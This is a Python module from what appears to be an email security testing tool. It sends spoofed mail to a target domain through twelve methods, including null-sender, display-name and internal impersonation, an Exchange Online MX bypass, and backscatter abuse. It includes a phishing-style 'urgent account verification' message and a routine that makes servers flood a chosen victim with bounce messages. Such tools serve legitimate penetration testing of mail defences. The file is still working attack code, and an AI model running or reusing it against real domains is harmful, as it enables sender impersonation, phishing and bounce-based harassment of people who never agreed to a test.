import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from email.mime.text import MIMEText
from email.utils import formatdate
from typing import Dict, List

from .config import config
from .dns_utils import query_mx, resolve_ipv4
from .checks.ghost import derive_exo_endpoint, mx_points_to_exo, exo_endpoint_resolves
from .smtp import direct_deliver, relay_deliver, amp_deliver, relay_configured
from . import logger

LOREM_IPSUM = (
   "Lorem ipsum dolor sit amet, consectetur adipiscing elit. "
   "Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. "
   "Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris "
   "nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in "
   "reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur."
)

SUBJECT = "Security Test"


def _sender_domain(sender: str) -> str:
   return sender.split("@")[1] if "@" in sender else "mail.local"


def build_email(sender: str, recipient: str, method: str = "",
                from_override: str = "") -> MIMEText:
   subject = f"{SUBJECT} - {method}" if method else SUBJECT
   domain = _sender_domain(from_override or sender)
   msg = MIMEText(LOREM_IPSUM, "plain", "utf-8")
   msg["From"] = from_override or sender
   msg["To"] = recipient
   msg["Subject"] = subject
   msg["Date"] = formatdate(localtime=True)
   msg["Message-ID"] = f"<{uuid.uuid4()}@{domain}>"
   msg["X-Oletros-Tool"] = "https://oletros.io/"
   return msg


def _resolve_mx_sorted(domain: str) -> List[tuple]:
   records = query_mx(domain)
   return sorted(records, key=lambda x: x[0]) if records else []


def resolve_recipient_mx(recipient: str) -> List[tuple]:
   return _resolve_mx_sorted(recipient.split("@")[1])


def _format_reason(result: Dict) -> str:
   if result.get("error"):
      return result["error"]
   if result.get("delivered"):
      return f"{result.get('data_code', 250)} {result.get('data_msg', 'OK')}"
   if result.get("mail_from_code", 0) >= 400:
      return f"MAIL FROM {result['mail_from_code']} {result['mail_from_msg']}"
   if result.get("rcpt_to_code", 0) >= 400:
      return f"RCPT TO {result['rcpt_to_code']} {result['rcpt_to_msg']}"
   if result.get("data_code", 0) >= 400:
      return f"DATA {result['data_code']} {result['data_msg']}"
   return "unknown"


def _status_from_result(result: Dict) -> str:
   if result["delivered"]:
      return "delivered"
   if result["connected"]:
      return "rejected"
   return "error"


def _make_result(method: str, result: Dict) -> Dict:
   return {"method": method, "status": _status_from_result(result),
           "server": result["server"], "reason": _format_reason(result), "smtp": result}


def _try_mx_delivery(mx_records: list, envelope_from: str, recipient: str,
                     msg_bytes: bytes, ehlo_host: str, timeout: float) -> Dict:
   last = None
   for _pref, exchange in mx_records:
      result = direct_deliver(exchange, 25, envelope_from, [recipient], msg_bytes, ehlo_host, timeout)
      last = result
      if result["connected"]:
         return result
   return last


def _skip_result(method: str, reason: str) -> Dict:
   return {"method": method, "status": "skip", "server": "-", "reason": reason}


def _error_result(method: str, reason: str) -> Dict:
   return {"method": method, "status": "error", "server": "-", "reason": reason}


def _deliver_via_relay_or_mx(method: str, envelope_from: str, recipient: str,
                             msg: MIMEText, ehlo_host: str, timeout: float) -> Dict:
   msg_bytes = msg.as_bytes()

   if relay_configured():
      result = relay_deliver(envelope_from, [recipient], msg_bytes, timeout)
      return _make_result(method, result)

   mx_records = resolve_recipient_mx(recipient)
   if not mx_records:
      return _error_result(method, "no MX for recipient domain")

   result = _try_mx_delivery(mx_records, envelope_from, recipient, msg_bytes, ehlo_host, timeout)
   if not result:
      return _error_result(method, "all MX unreachable")

   return _make_result(method, result)


def _deliver_via_target_mx(method: str, domain: str, envelope_from: str,
                           recipient: str, msg: MIMEText, ehlo_host: str,
                           timeout: float) -> Dict:
   msg_bytes = msg.as_bytes()
   mx_records = _resolve_mx_sorted(domain)
   if not mx_records:
      return _error_result(method, "no MX for target domain")

   result = _try_mx_delivery(mx_records, envelope_from, recipient, msg_bytes, ehlo_host, timeout)
   if not result:
      return _error_result(method, "all MX unreachable")

   return _make_result(method, result)


def method_direct(sender: str, recipient: str, timeout: float) -> Dict:
   msg = build_email(sender, recipient, "direct")
   ehlo = f"mail.{_sender_domain(sender)}"
   return _deliver_via_relay_or_mx("direct", sender, recipient, msg, ehlo, timeout)


def method_ghost(sender: str, recipient: str, timeout: float) -> Dict:
   msg = build_email(sender, recipient, "ghost")
   ehlo = f"mail.{_sender_domain(sender)}"
   recipient_domain = recipient.split("@")[1]
   endpoint = derive_exo_endpoint(recipient_domain)
   exo_ips = exo_endpoint_resolves(endpoint)

   if not exo_ips:
      return _skip_result("ghost", "recipient not on Exchange Online")

   mx_direct, _, _ = mx_points_to_exo(recipient_domain)
   if mx_direct:
      return _skip_result("ghost", "MX already direct to EXO (no bypass path)")

   result = direct_deliver(endpoint, 25, sender, [recipient], msg.as_bytes(), ehlo, timeout)
   return _make_result("ghost", result)


def method_null_from(sender: str, recipient: str, timeout: float) -> Dict:
   msg = build_email(sender, recipient, "null_from")
   ehlo = f"mail.{_sender_domain(sender)}"
   return _deliver_via_relay_or_mx("null_from", "", recipient, msg, ehlo, timeout)


def method_subdomain(domain: str, recipient: str, timeout: float) -> Dict:
   sub_sender = f"mercure@nonexistent.{domain}"
   msg = build_email(sub_sender, recipient, "subdomain")
   ehlo = f"mail.nonexistent.{domain}"
   return _deliver_via_relay_or_mx("subdomain", sub_sender, recipient, msg, ehlo, timeout)


def method_relay(sender: str, domain: str, recipient: str, timeout: float) -> Dict:
   msg = build_email(sender, recipient, "relay")
   ehlo = f"mail.{domain}"
   mx_records = _resolve_mx_sorted(domain)
   if not mx_records:
      return _skip_result("relay", "no MX for sender domain")

   result = _try_mx_delivery(mx_records, sender, recipient, msg.as_bytes(), ehlo, timeout)
   if not result:
      return _error_result("relay", "all MX unreachable")

   return _make_result("relay", result)


def method_mismatch(sender: str, recipient: str, timeout: float) -> Dict:
   envelope_domain = f"bounce-{uuid.uuid4().hex[:6]}.local"
   envelope_from = f"noreply@{envelope_domain}"
   msg = build_email(sender, recipient, "mismatch")
   ehlo = f"mail.{envelope_domain}"
   return _deliver_via_relay_or_mx("mismatch", envelope_from, recipient, msg, ehlo, timeout)


def method_display_name(sender: str, domain: str, recipient: str,
                        timeout: float) -> Dict:
   display_from = f'"{sender}" <noreply@notifications.{domain}>'
   envelope_from = f"noreply@notifications.{domain}"
   msg = build_email(sender, recipient, "display_name", from_override=display_from)
   ehlo = f"mail.notifications.{domain}"
   return _deliver_via_relay_or_mx("display_name", envelope_from, recipient, msg, ehlo, timeout)


def method_internal(sender: str, domain: str, recipient: str,
                    timeout: float) -> Dict:
   recipient_domain = recipient.split("@")[1].lower()
   if recipient_domain != domain.lower():
      return _skip_result("internal", f"recipient not in target domain ({recipient_domain} != {domain})")

   msg = build_email(sender, recipient, "internal")
   ehlo = f"mail.{domain}"
   return _deliver_via_target_mx("internal", domain, sender, recipient, msg, ehlo, timeout)


def method_backscatter(domain: str, recipient: str, timeout: float) -> Dict:
   dead_rcpt = f"user.{uuid.uuid4().hex[:6]}@{domain}"
   msg = build_email(f"noreply@{domain}", dead_rcpt, "backscatter")
   ehlo = f"mail.{_sender_domain(recipient)}"
   return _deliver_via_target_mx("backscatter", domain, recipient, dead_rcpt, msg, ehlo, timeout)


INJECT_BODY = (
   "URGENT: Your account security requires immediate verification.\n\n"
   "An unauthorized access attempt was detected from an unrecognized device.\n"
   "Please review your recent activity and confirm your identity immediately.\n\n"
   "If you did not initiate this request, your credentials may be compromised.\n"
   "Contact the IT Security team at security@{domain} or call ext. 4401.\n\n"
   "Reference: SEC-{ref}\n"
   "Priority: Critical\n"
   "Department: Information Security\n\n"
   "This notification was generated automatically by the security monitoring system.\n"
   "Do not reply to this message. Do not forward this message."
)


def method_bs_inject(domain: str, recipient: str, timeout: float) -> Dict:
   dead_rcpt = f"user.{uuid.uuid4().hex[:6]}@{domain}"
   ref = uuid.uuid4().hex[:12].upper()
   body = INJECT_BODY.format(domain=domain, ref=ref)
   msg = MIMEText(body, "plain", "utf-8")
   msg["From"] = f"security-alert@{domain}"
   msg["To"] = dead_rcpt
   msg["Subject"] = f"Security Test - bs_inject - Account Alert REF-{ref}"
   msg["Date"] = formatdate(localtime=True)
   msg["Message-ID"] = f"<{uuid.uuid4()}@{domain}>"
   msg["X-Priority"] = "1"
   msg["Importance"] = "High"
   msg["X-Oletros-Tool"] = "https://oletros.io/"

   ehlo = f"mail.{_sender_domain(recipient)}"
   return _deliver_via_target_mx("bs_inject", domain, recipient, dead_rcpt, msg, ehlo, timeout)


AMP_DEAD_COUNT = 5


def _amp_format_reason(result: Dict) -> str:
   if result.get("error"):
      return result["error"]
   accepted = result.get("accepted_count", 0)
   rejected = result.get("rejected_count", 0)
   total = result.get("total_recipients", 0)
   if result.get("delivered"):
      return f"{accepted}/{total} accepted, {accepted} potential NDRs to victim"
   if rejected == total:
      return f"all {total} recipients rejected (server validates before accept)"
   base = _format_reason(result)
   return f"{accepted}/{total} accepted - {base}"


def method_bs_amp(domain: str, recipient: str, timeout: float) -> Dict:
   dead_recipients = [f"user.{uuid.uuid4().hex[:6]}@{domain}" for _ in range(AMP_DEAD_COUNT)]
   msg = build_email(f"noreply@{domain}", dead_recipients[0], "bs_amp")
   ehlo = f"mail.{_sender_domain(recipient)}"
   mx_records = _resolve_mx_sorted(domain)
   if not mx_records:
      return _error_result("bs_amp", "no MX for target domain")

   result = None
   for _pref, exchange in mx_records:
      result = amp_deliver(exchange, 25, recipient, dead_recipients,
                           msg.as_bytes(), ehlo, timeout)
      if result["connected"]:
         break

   if not result:
      return _error_result("bs_amp", "all MX unreachable")

   status = _status_from_result(result)
   return {"method": "bs_amp", "status": status, "server": result["server"],
           "reason": _amp_format_reason(result), "smtp": result}


OOB_TARGETS = ["info", "contact", "support", "reception", "hello", "office"]


def method_bs_oob(domain: str, recipient: str, timeout: float) -> Dict:
   ehlo = f"mail.{_sender_domain(recipient)}"
   mx_records = _resolve_mx_sorted(domain)
   if not mx_records:
      return _error_result("bs_oob", "no MX for target domain")

   best_result = None
   accepted_target = None
   for target_local in OOB_TARGETS:
      target_addr = f"{target_local}@{domain}"
      msg = build_email(f"noreply@{domain}", target_addr, "bs_oob")

      for _pref, exchange in mx_records:
         result = direct_deliver(exchange, 25, recipient, [target_addr],
                                 msg.as_bytes(), ehlo, timeout)
         if result["connected"]:
            if result["delivered"]:
               best_result = result
               accepted_target = target_addr
               break
            if not best_result or not best_result["connected"]:
               best_result = result
               accepted_target = target_addr
            break

      if best_result and best_result.get("delivered"):
         break

   if not best_result:
      return _error_result("bs_oob", "all MX unreachable")

   base = _make_result("bs_oob", best_result)
   if best_result.get("delivered") and accepted_target:
      base["reason"] = f"auto-reply vector: {accepted_target} accepted, return-path={recipient}"
   elif best_result.get("connected") and accepted_target:
      base["reason"] = f"{accepted_target} rejected ({_format_reason(best_result)})"
   return base


def run_spoof(domain: str, recipient: str, timeout: float = 10.0,
              parallel: bool = True) -> List[Dict]:
   sender = f"mercure@{domain}"

   if relay_configured():
      logger.info(f"relay configured: {config.smtp_relay_host}:{config.smtp_relay_port} ({config.smtp_relay_user})")
   else:
      logger.info("no relay configured, using direct MX delivery")

   methods = [
      ("direct", lambda: method_direct(sender, recipient, timeout)),
      ("ghost", lambda: method_ghost(sender, recipient, timeout)),
      ("null_from", lambda: method_null_from(sender, recipient, timeout)),
      ("subdomain", lambda: method_subdomain(domain, recipient, timeout)),
      ("relay", lambda: method_relay(sender, domain, recipient, timeout)),
      ("mismatch", lambda: method_mismatch(sender, recipient, timeout)),
      ("display_name", lambda: method_display_name(sender, domain, recipient, timeout)),
      ("internal", lambda: method_internal(sender, domain, recipient, timeout)),
      ("backscatter", lambda: method_backscatter(domain, recipient, timeout)),
      ("bs_inject", lambda: method_bs_inject(domain, recipient, timeout)),
      ("bs_amp", lambda: method_bs_amp(domain, recipient, timeout)),
      ("bs_oob", lambda: method_bs_oob(domain, recipient, timeout)),
   ]

   if parallel:
      return _run_parallel(methods)
   return _run_sequential(methods)


def _run_parallel(methods: list) -> List[Dict]:
   results = {}
   with ThreadPoolExecutor(max_workers=6) as executor:
      futures = {}
      for name, fn in methods:
         logger.info(f"spoofing method: {name}")
         futures[executor.submit(fn)] = name

      for fut in as_completed(futures):
         name = futures[fut]
         try:
            result = fut.result()
            results[name] = result
            _log_result(name, result)
         except Exception as exc:
            logger.error(f"  {name}: exception - {exc}")
            results[name] = _error_result(name, str(exc))

   ordered = []
   for name, _ in methods:
      if name in results:
         ordered.append(results[name])
   return ordered


def _run_sequential(methods: list) -> List[Dict]:
   results = []
   for name, fn in methods:
      logger.info(f"spoofing method: {name}")
      try:
         result = fn()
         results.append(result)
         _log_result(name, result)
      except Exception as exc:
         logger.error(f"  {name}: exception - {exc}")
         results.append(_error_result(name, str(exc)))
   return results


def _log_result(name: str, result: Dict):
   st = result["status"]
   reason = result["reason"]
   if st == "delivered":
      logger.warning(f"  {name}: DELIVERED - {reason}")
   elif st == "rejected":
      logger.info(f"  {name}: REJECTED - {reason}")
   elif st == "skip":
      logger.info(f"  {name}: SKIPPED - {reason}")
   else:
      logger.error(f"  {name}: ERROR - {reason}")
